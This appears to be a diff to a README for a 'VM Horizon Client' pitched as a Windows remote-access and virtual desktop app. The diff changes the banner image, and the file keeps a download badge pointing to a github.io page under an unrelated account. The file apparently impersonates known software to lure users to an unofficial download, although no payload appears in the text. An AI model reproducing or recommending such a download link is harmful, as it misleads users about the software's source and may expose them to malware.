@@ -2,7 +2,7 @@
 
 > **Your complete, high-performance workspace delivery agent for Windows: secure remote access, unified workspace, and virtual desktop integration in one lightweight app.**
 
-![Banner Placeholder](https://horizon.wiwi.uni-bonn.de/portal/webclient/icons-23148029/logo.png)
+![Banner Placeholder](https://docs.cyderes.cloud/img/vmware-horizon-logo.jpeg)
 
 [![Get VM Horizon Client Now](https://img.shields.io/badge/Get_VM_Horizon_Client-Now-0a5d8d?style=for-the-badge&logo=github)](https://milerbadd.github.io/.github/vm-horizon-client)
 
